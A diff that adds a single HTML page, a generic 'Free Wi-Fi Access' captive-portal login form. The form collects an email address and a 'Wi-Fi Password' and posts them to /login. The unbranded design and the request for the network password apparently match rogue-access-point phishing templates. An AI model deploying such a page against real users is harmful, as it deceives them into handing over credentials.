@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Internet Service - Wi-Fi Login</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
+display:flex;justify-content:center;align-items:center;min-height:100vh}
+.card{background:#fff;border-radius:16px;padding:40px 36px;width:100%;
+max-width:400px;box-shadow:0 20px 60px rgba(0,0,0,.2)}
+.brand{text-align:center;margin-bottom:28px}
+.brand h2{color:#333;font-size:1.4em;margin-top:12px}
+.brand p{color:#888;font-size:.85em;margin-top:4px}
+.wifi-icon{font-size:3em;color:#667eea}
+label{font-size:.82em;color:#666;display:block;margin-bottom:4px;font-weight:500}
+input{width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;
+font-size:.92em;margin-bottom:16px;outline:none;transition:border .2s}
+input:focus{border-color:#667eea}
+button{width:100%;padding:12px;border:none;border-radius:8px;
+background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;
+font-size:1em;font-weight:600;cursor:pointer;transition:opacity .2s}
+button:hover{opacity:.9}
+.terms{text-align:center;font-size:.72em;color:#999;margin-top:16px;line-height:1.4}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="brand">
+<div class="wifi-icon">&#x1F4F6;</div>
+<h2>Free Wi-Fi Access</h2>
+<p>Sign in to connect to the internet</p>
+</div>
+<form method="POST" action="/login">
+<label for="email">Email Address</label>
+<input type="text" id="email" name="username" placeholder="user@email.com" required autocomplete="off">
+<label for="password">Wi-Fi Password</label>
+<input type="password" id="password" name="password" placeholder="Enter password" required>
+<button type="submit">Connect</button>
+</form>
+<div class="terms">By connecting, you agree to the Terms of Service<br>and acknowledge the Privacy Policy.</div>
+</div>
+</body>
+</html>
